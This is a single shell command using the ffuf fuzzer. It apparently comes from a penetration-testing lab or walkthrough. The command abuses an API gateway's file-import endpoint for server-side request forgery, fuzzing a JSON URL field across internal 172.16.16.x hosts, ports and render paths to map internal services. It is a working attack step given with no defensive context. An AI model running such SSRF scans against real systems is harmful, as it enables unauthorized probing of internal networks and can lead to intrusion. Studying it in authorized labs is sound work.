ffuf -X POST -u http://apigateway:8000/files/import \
  -d '{"url":"http://172.16.16.FUZZ1:FUZZ2FUZZ3"}' \
  -H "Content-Type:application/json" \
  -w ./active_hosts.txt:FUZZ1 \
  -w ./ports.txt:FUZZ2 \
  -w ./potential_render_path.txt:FUZZ3 \
  -mr "400" -timeout 5 -t 10
